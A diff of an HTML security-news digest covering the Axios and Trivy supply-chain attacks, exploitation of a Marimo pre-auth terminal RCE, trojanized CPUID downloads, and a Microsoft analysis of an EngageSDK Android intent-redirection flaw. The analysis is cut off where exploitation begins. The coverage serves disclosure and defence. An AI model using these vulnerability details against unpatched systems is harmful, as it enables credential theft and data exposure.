@@ -59,12 +59,100 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-04-12</h1>
+        <h1>Security Briefing // 2026-04-13</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">CPUID Breach Distributes STX RAT via Trojanized CPU-Z and HWMonitor Downloads</button></li><li><button onclick="show('art-1')">Adobe Patches Actively Exploited Acrobat Reader Flaw CVE-2026-34621</button></li><li><button onclick="show('art-2')">Over 20,000 crypto fraud victims identified in international crackdown</button></li><li><button onclick="show('art-3')">Ghostwriter v6.3.0 and CLI v1.0.0: New Activity Logging, Faster Installs, and Better Writing QA</button></li><li><button onclick="show('art-4')">Intent redirection vulnerability in third-party SDK exposed millions of Android wallets to potential risk</button></li><li><button onclick="show('art-5')">Russia Hacked Routers to Steal Microsoft Office Tokens</button></li><li><button onclick="show('art-6')">Building a Detection Foundation: Part 5 - Correlation in Practice</button></li><li><button onclick="show('art-7')">Germany Doxes “UNKN,” Head of RU Ransomware Gangs REvil, GandCrab</button></li><li><button onclick="show('art-8')">CISA Adds Five Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-9')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li></ul>
+            <ul><li><button onclick="show('art-0')">OpenAI Revokes macOS App Certificate After Malicious Axios Supply Chain Incident</button></li><li><button onclick="show('art-1')">Critical Marimo pre-auth RCE flaw now under active exploitation</button></li><li><button onclick="show('art-2')">CPUID Breach Distributes STX RAT via Trojanized CPU-Z and HWMonitor Downloads</button></li><li><button onclick="show('art-3')">Ghostwriter v6.3.0 and CLI v1.0.0: New Activity Logging, Faster Installs, and Better Writing QA</button></li><li><button onclick="show('art-4')">Russia Hacked Routers to Steal Microsoft Office Tokens</button></li><li><button onclick="show('art-5')">Building a Detection Foundation: Part 5 - Correlation in Practice</button></li><li><button onclick="show('art-6')">Germany Doxes “UNKN,” Head of RU Ransomware Gangs REvil, GandCrab</button></li><li><button onclick="show('art-7')">Mitigating the Axios npm supply chain compromise</button></li><li><button onclick="show('art-8')">CISA Adds Five Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-9')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">OpenAI Revokes macOS App Certificate After Malicious Axios Supply Chain Incident</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/openai-revokes-macos-app-certificate.html" target="_blank">Original Link</a></p>
+            <div class="content-text">OpenAI revealed a GitHub Actions workflow used to sign its macOS apps, which downloaded the malicious Axios library on March 31, but noted that no user data or internal system was compromised.
+"Out of an abundance of caution, we are taking steps to protect the process that certifies our macOS applications are legitimate OpenAI apps," OpenAI [said](https://openai.com/index/axios-developer-tool-compromise/) in a post last week. "We found no evidence that OpenAI user data was accessed, that our systems or intellectual property were compromised, or that our software was altered."
+The disclosure comes a little over a week after Google Threat Intelligence Group (GTIG) attributed the [supply chain compromise](https://thehackernews.com/2026/04/google-attributes-axios-npm-supply.html) of the popular npm package to a North Korean hacking group it tracks as [UNC1069](https://thehackernews.com/2026/04/unc1069-social-engineering-of-axios.html).
+The attack enabled the threat actors to hijack the package maintainer's npm account to push two poisoned versions 1.14.1 and 0.30.4 that came embedded with a malicious dependency named "plain-crypto-js," which deployed a cross-platform backdoor called WAVESHAPER.V2 to infect Windows, macOS, and Linux systems.
+The artificial intelligence (AI) company said a GitHub Actions workflow it uses as part of its macOS app-signing process downloaded and executed Axios version 1.14.1. The workflow, it added, had access to a certificate and notarization material used for signing ChatGPT Desktop, Codex, Codex CLI, and Atlas.
+"Our analysis of the incident concluded that the signing certificate present in this workflow was likely not successfully exfiltrated by the malicious payload due to the timing of the payload execution, certificate injection into the job, sequencing of the job itself, and other mitigating factors," the company said.
+Despite finding no evidence of data exfiltration, OpenAI said it's treating the certificate as compromised and that it's revoking and rotating it. As a result, older versions of all its macOS desktop apps will no longer receive updates or support starting May 8, 2026.
+This also means that apps signed with the previous certificate will be blocked by macOS security protections by default, preventing them from being downloaded or launched. The earliest releases signed with their updated certificate are listed below -
+- ChatGPT Desktop - 1.2026.071
+- Codex App - 26.406.40811
+- Codex CLI - 0.119.0
+- Atlas - 1.2026.84.2
+As part of its remediation efforts, OpenAI is also working with Apple to ensure software signed with the previous certificate cannot be newly notarized. The 30-day window till May 8, 2026, is a way to minimize user disruption and give them enough time to make sure they are updated to the latest version, it pointed out.
+"In the event that the certificate was successfully compromised by a malicious actor, they could use it to sign their own code, making it appear as legitimate OpenAI software," OpenAI said. "We have stopped new software notarizations using the old certificate, so new software signed with the old certificate by an unauthorized third-party would be blocked by default by macOS security protections unless a user explicitly bypasses them."
+Two Supply Chain Attacks Rock March
+The breach of Axios, one of the most widely used HTTP client libraries, was one of the two major supply chain attacks that took place in March aimed at the open-source ecosystem. The [other incident](https://ramimac.me/teampcp/) targeted [Trivy](https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/), a vulnerability scanner maintained by Aqua Security, resulting in [cascading impacts](https://snyk.io/articles/trivy-github-actions-supply-chain-compromise/) across five ecosystems, affecting a number of other popular libraries depending on it.
+The attack, the work of a cybercriminal group called [TeamPCP](https://thehackernews.com/2026/03/teampcp-pushes-malicious-telnyx.html) (aka UNC6780), deployed a credential stealer dubbed SANDCLOCK that facilitated the extraction of sensitive data from developer environments. Subsequently, the threat actors weaponized the stolen credentials to compromise npm packages and push a self-propagating worm named [CanisterWorm](https://www.stepsecurity.io/blog/canisterworm-how-a-self-propagating-npm-worm-is-spreading-backdoors-across-the-ecosystem).
+Days later, the crew used secrets pilfered from the Trivy intrusion to inject the same malware into two GitHub Actions workflows maintained by Checkmarx. The threat actors then followed it up by publishing malicious versions of [LiteLLM](https://docs.litellm.ai/blog/security-update-march-2026) and [Telnyx](https://www.akamai.com/blog/security-research/telnyx-pypi-2026-teampcp-supply-chain-attacks) to the Python Package Index (PyPI), both of which use Trivy in their CI/CD pipeline.
+"The Telnyx compromise indicates a continued change in the techniques used in TeamPCP's supply chain activity, with adjustments to tooling, delivery methods, and platform coverage," Trend Micro [said](https://www.trendmicro.com/en_us/research/26/c/teampcp-telnyx-attack-marks-a-shift-in-tactics.html) in an [analysis of the attack](https://www.trendmicro.com/en_us/research/26/c/your-ai-stack-just-handed-over-your-root-keys-inside-the-litellm-pypi-breach.html).
+"In just eight days, the actor has pivoted across security scanners, AI infrastructure, and now telecommunications tooling, evolving their delivery from inline Base64 to .pth auto-execution, and ultimately to split-file WAV steganography, while also expanding from Linux-only to dual-platform targeting with Windows persistence."
+On [Windows systems](https://www.ox.security/blog/teampcps-telnyx-windows-malware-technical-analysis/), the hack of the [Telnyx Python SDK](https://x.com/TheEnergyStory/status/2038238773721325996) resulted in the deployment of an executable named "msbuild.exe" that employs several obfuscation techniques to evade detection and extracts DonutLoader, a shellcode loader, from a PNG image present within the binary to load a full-featured trojan and a [beacon](https://www.threatlocker.com/blog/supply-chain-attack-security-scanner-compromise-leads-to-widespread-infostealer-and-ransomware-pivot) associated with [AdaptixC2](https://thehackernews.com/2025/10/russian-ransomware-gangs-weaponize-open.html), an open-source command-and-control (C2) framework.
+Additional analyses of the campaign, now identified as CVE-2026-33634, have been published by various cybersecurity vendors -
+[CrowdStrike](https://www.crowdstrike.com/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/)[FUTURESEARCH](https://futuresearch.ai/blog/no-prompt-injection-required/)[Hexastrike](https://hexastrike.com/resources/blog/threat-intelligence/ringing-in-chaos-how-teampcp-weaponized-the-telnyx-python-sdk/)[Kudelski Security](https://kudelskisecurity.com/research/investigating-two-variants-of-the-trivy-supply-chain-compromise)[Microsoft](https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/)[OpenSourceMalware](https://opensourcemalware.com/blog/teampcp-supply-chain-campaign)[Palo Alto Networks Unit 42](https://unit42.paloaltonetworks.com/teampcp-supply-chain-attacks/)[ReversingLabs](https://www.reversinglabs.com/blog/teampcp-supply-chain-attack-spreads)[SOCRadar](https://socradar.io/blog/teampcp-checkmarx-github-actions-attack/)[Sonatype](https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer)[StepSecurity](https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel)[Synk](https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/)[Trend Micro](https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html)[TRUESEC](https://www.truesec.com/hub/blog/malicious-pypi-package-litellm-supply-chain-compromise)[Wiz](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign)
+TeamPCP's supply chain compromise rampage may have come to an end, but the group has since shifted its focus towards monetizing existing credential harvests by teaming up with other financially motivated groups like Vect, LAPSUS$, and ShinyHunters. Evidence indicates that the threat actor has also launched a proprietary ransomware operation under the name CipherForce.
+These efforts have been complemented by TeamPCP's use of the stolen data to access cloud and software-as-a-service (SaaS) environments, marking a new-found escalation of the campaign. To that end, the cybercrime gang has been found to verify stolen credentials using TruffleHog, launch discovery operations within 24 hours of validation, exfiltrate more data, and attempt lateral movement to gain access to the broader network.
+"The credentials and secrets stolen in the supply chain compromises were quickly validated and used to explore victim environments and exfiltrate additional data," Wiz researchers [said](https://www.wiz.io/blog/tracking-teampcp-investigating-post-compromise-attacks-seen-in-the-wild). "While the speed at which they were used suggests that it was the work of the same threat actors responsible for the supply chain operations, we are not able to rule out the secrets being shared with other groups and used by them."
+Attacks Ripple Through Dependencies
+Google has [warned](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package) that "hundreds of thousands of stolen secrets" could potentially be circulating as a result of the Axios and Trivy attacks, fueling more software supply chain attacks, SaaS environment compromises, ransomware and extortion events, and cryptocurrency theft over the near term.
+Two organizations that have confirmed compromise through the Trivy supply chain attack are artificial intelligence (AI) data training startup [Mercor](https://x.com/mercor_ai/status/2039101905675403306) and the [European Commission](https://ec.europa.eu/commission/presscorner/detail/en/ip_26_748). While the company has not shared details on the impact, the LAPSUS$ extortion group listed Mercor on its leak site, claiming to have exfiltrated about 4TB of data. The Mercor breach has led Meta to pause its work with the company, according to a [report](https://www.wired.com/story/meta-pauses-work-with-mercor-after-data-breach-puts-ai-industry-secrets-at-risk/) from WIRED.
+Earlier this month, CERT-EU [revealed](https://cert.europa.eu/blog/european-commission-cloud-breach-trivy-supply-chain) that the threat actors used the stolen AWS secret to exfiltrate data from the Commission's cloud environment. This included data relating to websites hosted for up to 71 clients of the Europa web hosting service and outbound email communications. The ShinyHunters group has since released the exfiltrated dataset publicly on its dark web leak site.
+GitGuardian's [analysis](https://blog.gitguardian.com/team-pcp-snowball-analysis/) of the Trivy and LiteLLM supply chain attacks and their spread through dependencies and automation pipelines has found that 474 public repositories executed malicious code from the compromised "trivy-action" workflow, and 1,750 Python packages were configured in a way that would automatically pull the poisoned versions.
+"TeamPCP is deliberately targeting security tools that run with elevated privileges by design. Compromising them gives the attacker access to some of the most sensitive environments in the organization, because security tools are typically granted broad access by design," Brett Leatherman, assistant director of Cyber Division at the U.S. Federal Bureau of Investigation (FBI), [wrote](https://www.linkedin.com/posts/bleatherman_fbicyber-share-7442369430245826560-IA9x/?rcm=ACoAAA98Bu8BVZIE7tjrbfEgLetF8Wf_4bWQNHc&skipRedirect=true) on LinkedIn.
+The supply chain incidents are dangerous because they take aim at the inherent trust developers assume when downloading packages and dependencies from open-source repositories. "Trust was assumed where it should have been verified," Mark Lechner, chief information security officer at Docker, [said](https://www.docker.com/blog/defending-your-software-supply-chain-what-every-engineering-team-should-do-now/).
+"The organizations that came through these incidents with minimal damage had already begun replacing implicit trust with explicit verification at every layer of their stack: verified base images instead of community pulls, pinned references instead of mutable tags, scoped and short-lived credentials instead of long-lived tokens, and sandboxed execution environments instead of wide-open CI runners."
+Both Docker and the Python Package Index (PyPI) maintainers have [outlined](https://blog.pypi.org/posts/2026-04-02-incident-report-litellm-telnyx-supply-chain-attack/) a long list of recommendations that developers can implement to counter such attacks -
+- Pin packages by digest or commit SHA instead of mutable tags.
+- Use Docker Hardened Images (DHI).
+- Enforce minimum release age settings to delay adoption of new versions for dependency updates.
+- Treat every CI runner as a potential breach point and avoid pull_request_targe triggers in GitHub Actions unless absolutely necessary.
+- Use short-lived, narrowly scoped credentials.
+- Use an internal mirror or artifact proxy.
+- Deploy canary tokens to get alerted to potential exfiltration attempts.
+- Audit environment for hard-coded secrets.
+- Run AI coding agents in sandboxed environments.
+- Use trusted publishing to push packages to
+[npm](https://docs.npmjs.com/trusted-publishers)and[PyPI](https://docs.pypi.org/trusted-publishers/). - Secure the open-source development pipeline with two-factor authentication (2FA).
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has also [added](https://www.cisa.gov/news-events/alerts/2026/03/26/cisa-adds-one-known-exploited-vulnerability-catalog) CVE-2026-33634 to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, mandating that Federal Civilian Executive Branch (FCEB) agencies apply the necessary mitigations by April 9, 2026.
+"The number of recent software supply chain attacks is overwhelming," Charles Carmakal, chief technology officer of Mandiant Consulting at Google, [said](https://www.linkedin.com/posts/charlescarmakal_cybersecurity-threatintel-supplychain-activity-7444746390288789504-rHpT/?rcm=ACoAAAAHXmsBeL1ZrOKRT8g9rCLjiQfqDSJUjk4). "Defenders need to pay close attention to these campaigns. Enterprises should spin up dedicated projects to assess the existing impact, remediate, and harden against future attacks."
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Critical Marimo pre-auth RCE flaw now under active exploitation</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/critical-marimo-pre-auth-rce-flaw-now-under-active-exploitation/" target="_blank">Original Link</a></p>
+            <div class="content-text">Hackers started exploiting a critical vulnerability in the Marimo open-source reactive Python notebook platform just 10 hours after its public disclosure.
+The flaw allows remote code execution without authentication in Marimo versions 0.20.4 and earlier. It tracked as [CVE-2026-39987](https://nvd.nist.gov/vuln/detail/CVE-2026-39987) and GitHub assessed it with a critical score of 9.3 out of 10.
+According to researchers at cloud-security company Sysdig, attackers created an exploit from the information in the [developer's advisory](https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc) and immediately started using it in attacks that exfiltrated sensitive information.
+Marimo is an [open-source](https://github.com/marimo-team/marimo) Python notebook environment, typically used by data scientists, ML/AI practitioners, researchers, and developers building data apps or dashboards. It is a fairly popular project, with 20,000 GitHub stars and 1,000 forks.
+CVE-2026-39987 is caused by the WebSocket endpoint ‘/terminal/ws’ exposing an interactive terminal without proper authentication checks, allowing connections from any unauthenticated client.
+This gives direct access to a full interactive shell, running with the same privileges as the Marimo process.
+Marimo disclosed the flaw on April 8 and yesterday released [version 0.23.0](https://github.com/marimo-team/marimo/releases/tag/0.23.0) to address it. The developers noted that the flaw affects users who deployed Marimo as an editable notebook, and those who expose Marimo to a shared network using --host 0.0.0.0 while in edit mode.
+Exploitation in the wild
+Within the first 12 hours after the vulnerability details were disclosed, 125 IP addresses began reconnaissance activity, according to Sysdig.
+Less than 10 hours after the disclosure, the researchers observed the first exploitation attempt in a credential theft operation.
+The attacker first validated the vulnerability by connecting to the /terminal/ws endpoint and executing a short scripted sequence to confirm remote command execution, disconnecting within seconds.
+Shortly after, they reconnected and began manual reconnaissance, issuing basic commands such as pwd, whoami, and ls to understand the environment, followed by directory navigation attempts and checks for SSH-related locations.
+Next, the attacker focused on credential harvesting, immediately targeting the .env file and extracting environment variables, including cloud credentials and application secrets. They then attempted to read additional files in the working directory and continued probing for SSH keys.
+The entire credential access phase was completed in less than three minutes, notes a [Sysdig report](https://www.sysdig.com/blog/marimo-oss-python-notebook-rce-from-disclosure-to-exploitation-in-under-10-hours) this week.
+Roughly an hour later, the attacker returned for a second exploitation session using the same exploit sequence.
+The researchers say that behind the attack appears to be a “methodical operator” with a hands-on approach, rather than automated scripts, focusing on high-value objectives such as stealing .env credentials and SSH keys.
+The attackers did not attempt to install persistence, deploy cryptominers, or backdoors, suggesting a quick, stealthy operation.
+Marimo users are recommended to upgrade to version 0.23.0 immediately, monitor WebSocket connections to ‘/terminal/ws,’ restrict external access via a firewall, and rotate all exposed secrets.
+If upgrading is not possible, an effective mitigation is to block or disable access to the ‘/terminal/ws’ endpoint entirely.
+[Automated Pentesting Covers Only 1 of 6 Surfaces.](https://hubs.li/Q048zztN0)
+Automated pentesting proves the path exists. BAS proves whether your controls stop it. Most teams run one without the other.
+This whitepaper maps six validation surfaces, shows where coverage ends, and provides practitioners with three diagnostic questions for any tool evaluation.
+Post a Comment Community Rules
+You need to login in order to post a comment
+Not a member yet? Register Now</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
             <h2 class="article-title">CPUID Breach Distributes STX RAT via Trojanized CPU-Z and HWMonitor Downloads</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cpuid-breach-distributes-stx-rat-via.html" target="_blank">Original Link</a></p>
             <div class="content-text">Unknown threat actors compromised CPUID ("cpuid[.]com"), a website that hosts popular hardware monitoring tools like CPU-Z, HWMonitor, HWMonitor Pro, and PerfMonitor, for less than 24 hours to serve malicious executables for the software and deploy a remote access trojan called STX RAT.
@@ -86,48 +174,6 @@ Kaspersky said it has identified more than 150 victims, mostly individuals who w
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Adobe Patches Actively Exploited Acrobat Reader Flaw CVE-2026-34621</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/adobe-patches-actively-exploited.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Adobe has released emergency updates to fix a critical security flaw in Acrobat Reader that has come under active exploitation in the wild.
-The vulnerability, assigned the CVE identifier [CVE-2026-34621](https://helpx.adobe.com/security/products/acrobat/apsb26-43.html), carries a CVSS score of 8.6 out of 10.0. Successful exploitation of the flaw could allow an attacker to run malicious code on affected installations.
-It has been described as a case of [prototype pollution](https://cwe.mitre.org/data/definitions/1321.html) that could result in arbitrary code execution. Prototype pollution refers to a [JavaScript security vulnerability](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution) that permits an attacker to manipulate an application'sobjects and properties.
-The issue impacts the following products and versions for both Windows and macOS -
-- Acrobat DC versions 26.001.21367 and earlier (Fixed in 26.001.21411)
-- Acrobat Reader DC versions 26.001.21367 and earlier (Fixed in 26.001.21411)
-- Acrobat 2024 versions 24.001.30356 and earlier (Fixed in 24.001.30362 for Windows and 24.001.30360 for macOS)
-Adobe acknowledged that it's "aware of CVE-2026-34621 being exploited in the wild."
-The development comes days after security researcher and EXPMON founder Haifei Li [disclosed](https://thehackernews.com/2026/04/adobe-reader-zero-day-exploited-via.html) details of zero-day exploitation of the flaw to run malicious JavaScript code when opening specially crafted PDF documents through Adobe Reader. There is evidence suggesting that the vulnerability may have been under exploitation since December 2025.
-"It appears that Adobe has determined the bug can lead to arbitrary code execution — not just an information leak," EXPMON [said](https://x.com/EXPMON_/status/2042982865345135006) in a post on X. "This aligns with our findings and those of other security researchers over the last few days."
-(The story was updated after publication to reflect the change in CVSS score from 9.6 to 8.6. In a revision to its advisory on April 12, 2026, Adobe said it adjusted the attack vector from Network (AV:N) to Local (AV:L).)
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">Over 20,000 crypto fraud victims identified in international crackdown</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/police-identifies-20-000-victims-in-international-crypto-fraud-crackdown/" target="_blank">Original Link</a></p>
-            <div class="content-text">An international law enforcement action led by the U.K.'s National Crime Agency (NCA) has identified over 20,000 victims of cryptocurrency fraud across Canada, the United Kingdom, and the United States.
-Dubbed "Operation Atlantic," this joint action took place last month, and it involved the NCA, the U.S. Secret Service, the Ontario Provincial Police, the Ontario Securities Commission, and multiple private industry partners.
-"The NCA hosted law enforcement agencies at their London HQ and through real time intelligence sharing, technical capabilities and victim outreach, multiple fraud networks were disrupted across the world," the [NCA said](http://www.nationalcrimeagency.gov.uk/news/fraudsters-targeting-cryptocurrency-stopped-and-12-million-frozen-in-nca-led-operation-atlantic). "City of London Police, Financial Conduct Authority and other international law enforcement bodies also joined the weeklong action."
-The investigators have also frozen more than $12 million in suspected criminal proceeds obtained through "approval phishing" attacks, in which scammers trick victims into granting them access to their cryptocurrency wallets, typically via investment scams. They also identified more than $45 million in stolen cryptocurrency connected to fraud schemes worldwide.
-Officials said the public-private partnership model used in Operation Atlantic will be a core element of the U.K. government's recently announced [Fraud Strategy](https://www.gov.uk/government/publications/fraud-strategy-2026-to-2029), which connects industry data and law enforcement expertise to enable fraud prevention.
-"Operation Atlantic is a powerful example of what is possible when international agencies and private industry work side by side," added Miles Bonfield, NCA Deputy Director of Investigations.
-"This intensive action has led to the safeguarding of thousands of victims in the UK and overseas, stopped criminals in their tracks and helped save others from losing their funds."
-The NCA added that, together with law enforcement and private-sector partners, it will continue to analyze intelligence gathered during this joint action to support other victims and pursue potential criminal activity.
-Since January 2024, the FBI has also identified more than 8,000 victims of cryptocurrency investment fraud (also known as pig butchering) with support from the U.S. Secret Service, as part of [Operation Level Up](https://www.fbi.gov/how-we-can-help-you/victim-services/national-crimes-and-victim-resources/operation-level-up). The FBI said that roughly 77% of those victims were unaware they were being scammed and that the estimated savings to victims is $511,511,288.
-In its [2025 Internet Crime Report](https://www.ic3.gov/AnnualReport/Reports/2025_IC3Report.pdf), the FBI said it received 61,559 complaints of cryptocurrency investment fraud last year, linked to $7.228 billion in losses and representing a massive 48% increase in complaints and a 25% increase in losses from 2024.
-[Automated Pentesting Covers Only 1 of 6 Surfaces.](https://hubs.li/Q048zztN0)
-Automated pentesting proves the path exists. BAS proves whether your controls stop it. Most teams run one without the other.
-This whitepaper maps six validation surfaces, shows where coverage ends, and provides practitioners with three diagnostic questions for any tool evaluation.
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
         <div id="art-3" class="article-body">
             <h2 class="article-title">Ghostwriter v6.3.0 and CLI v1.0.0: New Activity Logging, Faster Installs, and Better Writing QA</h2>
             <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/04/10/ghostwriter-v6-3-0-and-cli-v1-0-0-new-activity-logging-faster-installs-and-better-writing-qa/" target="_blank">Original Link</a></p>
@@ -140,98 +186,6 @@ Not a member yet? Register Now</div>
             <hr class="separator">
         </div>
         <div id="art-4" class="article-body">
-            <h2 class="article-title">Intent redirection vulnerability in third-party SDK exposed millions of Android wallets to potential risk</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/09/intent-redirection-vulnerability-third-party-sdk-android/" target="_blank">Original Link</a></p>
-            <div class="content-text">During routine security research, we identified a severe intent redirection vulnerability in a widely used third-party Android SDK called EngageSDK. This flaw allows apps on the same device to bypass Android security sandbox and gain unauthorized access to private data. With over 30 million installations of third-party crypto wallet applications alone, the exposure of PII, user credentials and financial data were exposed to risk. All of the detected apps using vulnerable versions have been removed from Google Play.
-Following our Coordinated Vulnerability Disclosure practices (via Microsoft Security Vulnerability Research), we notified EngageLab and the Android Security Team. We collaborated with all parties to investigate and validate the issue, which was resolved as of November 3, 2025 in [version 5.2.1](https://mvnrepository.com/artifact/com.engagelab/engagelab/5.2.1) of the EngageSDK. This case shows how weaknesses in third‑party SDKs can have large‑scale security implications, especially in high‑value sectors like digital asset management.
-As of the time of writing, we are not aware of any evidence indicating that this vulnerability has been exploited in the wild. Nevertheless, we strongly recommend that developers who integrate the affected SDK upgrade to the latest available version. While this is a vulnerability introduced by a third-party SDK, Android’s existing layered security model is capable of providing additional mitigations against exploitation of vulnerabilities through intents. Android has updated these automatic user protections to provide additional mitigation against the specific EngageSDK risks described in this report while developers update to the non-vulnerable version of EngageSDK. Users who previously downloaded a vulnerable app are protected.
-In this blog, we provide a technical analysis of a vulnerability that bypasses core Android security mechanisms. We also examine why this issue is significant in the current landscape: apps increasingly rely on third‑party SDKs, creating large and often opaque supply‑chain dependencies.
-As mobile wallets and other high‑value apps become more common, even small flaws in upstream libraries can impact millions of devices. These risks increase when integrations expose exported components or rely on trust assumptions that aren’t validated across app boundaries.
-Because Android apps frequently depend on external libraries, insecure integrations can introduce attack surfaces into otherwise secure applications. We provide resources for three key audiences:
-- Developers: In addition to the
-[best practices](https://developer.android.com/privacy-and-security/security-tips)Android provides its developers, we provide practical guidance on identifying and preventing similar flaws, including how to review dependencies and validate exported components. - Researchers: Insights into how we discovered the issue and the methodology we used to confirm its impact.
-- General readers: An explanation of the implications of this vulnerability and why ecosystem‑wide vigilance is essential.
-This analysis reflects Microsoft’s visibility into cross‑platform security threats. We are committed to safeguarding users, even in environments and applications that Microsoft does not directly build or operate. You can find a detailed set of recommendations, detection guidance and indicators at the end of this post to help you assess exposure and strengthen protections.
-Technical details
-The Android operating system integrates a variety of security mechanisms, such as memory isolation, filesystem discretionary and mandatory access controls (DAC/MAC), biometric authentication, and network traffic encryption. Each of these components functions according to its own security framework, which may not always align with the others[1].
-Unlike many other operating systems where applications run with the user’s privileges, Android assigns each app with a unique user ID and executes it within its own sandboxed environment. Each app has a private directory for storing data that is not meant to be shared. By default, other apps cannot access this private space unless the owning app explicitly exposes data through components known as content providers.
-To facilitate communication between applications, Android uses intents[2]. Beyond inter-app messaging, intents also enable interaction among components within the same application as well as data sharing between those components.
-It’s worth noting that while any application can send an intent to another app or component, whether that intent is actually delivered—and more broadly, whether the communication is permitted—depends on the identity and permissions of the sending application.
-Intent redirection vulnerability
-Intent Redirection occurs when a threat actor manipulates the contents of an intent that a vulnerable app sends using its own identity and permissions.
-In this scenario, the threat actor leverages the trusted context of the affected app to run a malicious payload with the app’s privileges. This can lead to:
-- Unauthorized access to protected components
-- Exposure of sensitive data
-- Privilege escalation within the Android environment
-Android Security Team classifies this vulnerability as severe. Apps flagged as vulnerable are subject to enforcement actions, including potential removal from the platform[3].
-EngageLab SDK intent redirection
-Developers use the EngageLab SDK to manage messaging and push notifications in mobile apps. It functions as a library that developers integrate into Android apps as a dependency. Once included, the SDK provides APIs for handling communication tasks, making it a core component for apps that require real-time engagement.
-The vulnerability was identified in an exported activity (MTCommonActivity) that gets added to an application’s Android manifest once the library is imported into a project, after the build process. This activity only appears in the merged manifest, which is generated post-build (see figure below), and therefore is sometimes missed by developers. Consequently, it often escapes detection during development but remains exploitable in the final APK.
-When an activity is declared as exported in the Android manifest, it becomes accessible to other applications installed on the same device. This configuration permits any other application to explicitly send an intent to this activity.
-The following section outlines the intent handling process from the moment the activity receives an intent to when it dispatches one under the affected application’s identity.
-Intent processing in the vulnerable activity
-When an activity receives an intent, its response depends on its current lifecycle state:
-- If the activity is starting for the first time, the onCreate() method runs.
-- If the activity is already active, the onNewIntent() method runs instead.
-In the vulnerable MTCommonActivity, both callbacks invoke the processIntent() method.
-This method (see figure below) begins by initializing the uri variable on line 10 using the data provided in the incoming intent. If the uri variable is not empty, then – according to line 16 – it invokes the processPlatformMessage():
-The processPlatformMessage() method instantiates a JSON object using the uri string supplied as an argument to this method (see line 32 below):
-Each branch of the if statement checks the JSON object for a field named n_intent_uri. If this field exists, the method performs the following actions:
-- Creates a NotificationMessage object
-- Initializes its intentUri field by using the appropriate setter (see line 52).
-An examination of the intentUri field in the NotificationMessage class identified the following method as a relevant point of reference:
-On line 353, the method above obtains the intentUri value and attempts to create a new intent from it by calling the method a() on line 360. The returned intent is subsequently dispatched using the startActivity() method on line 365. The a() method is particularly noteworthy, as it serves as the primary mechanism responsible for intent redirection:
-This method appears to construct an implicit intent by invoking setComponent(), which clears the target component of the parseUri intent by assigning a null value (line 379). Under normal circumstances, such behavior would result in a standard implicit intent, which poses minimal risk because it does not specify a concrete component and therefore relies on the system’s resolution logic.
-However, as observed on line 377, the method also instantiates a second intent variable — its purpose not immediately evident—which incorporates an explicit intent. Crucially, this explicitly targeted intent is the one returned at line 383, rather than the benign parseUri intent.
-Another notable point is that the parseUri() method (at line 376) is called with the URI_ALLOW_UNSAFE flag (constant value 4), which can permit access to an application’s content providers [6] (see exploitation example below).
-These substitutions fundamentally alter the method’s behavior: instead of returning a non‑directed, system‑resolved implicit intent, it returns an intent with a predefined component, enabling direct invocation of the targeted activity as well as access to the application’s content providers. As noted previously, this vulnerability can, among other consequences, permit access to the application’s private directory by gaining entry through any available content providers, even those that are not exported.
-Exploitation starts when a malicious app creates an intent object with a crafted URI in the extra field. The vulnerable app then processes this URI, creating and sending an intent using its own identity and permissions.
